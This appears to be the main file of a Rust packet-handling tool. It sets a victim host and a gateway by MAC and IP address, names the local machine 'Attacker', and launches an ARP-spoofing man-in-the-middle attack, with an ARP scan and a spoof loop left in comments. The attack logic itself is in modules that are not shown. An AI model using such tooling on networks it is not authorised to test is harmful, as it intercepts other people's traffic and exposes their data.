mod full_packet;
mod host;
mod network_utils;
mod packet_handler;
mod packet_stream;
mod protocol_utils;
mod sender;
mod sniffer;
mod utils;

use std::{net::Ipv4Addr, str::FromStr};

use host::Host;
use packet_handler::PacketHandler;
use pnet::util::MacAddr;

#[tokio::main]
async fn main() {
    let start_time = std::time::Instant::now();

    let mut ph = PacketHandler::new("eth0");

    // ph.arp_scan().await;
    // println!(
    //     "Elapsed Time: {:.2} seconds",
    //     start_time.elapsed().as_secs_f32()
    // );
    let spoofed = Host::custom(
        MacAddr::from_str("b4:2e:99:5a:99:b5").expect("Wrong mac"),
        Ipv4Addr::from_str("10.100.102.7").expect("Wrong Ip"), 
        24
    );

    let gateway = Host::custom(
        MacAddr::from_str("34:49:5b:10:94:67").expect("Wrong mac"),
        Ipv4Addr::from_str("10.100.102.1").expect("Wrong Ip"), 
        24
    );

    println!("Spoofed: {:?}, Gateway: {:?}, Attacker: {:?}", spoofed, gateway, ph.sender.host);
    ph.man_in_the_middle(&spoofed, &gateway).await;
    // loop {
    //     ph.arp_spoof(&spoofed, &gateway).await;
    //     std::thread::sleep(std::time::Duration::from_millis(500));
    // }
}
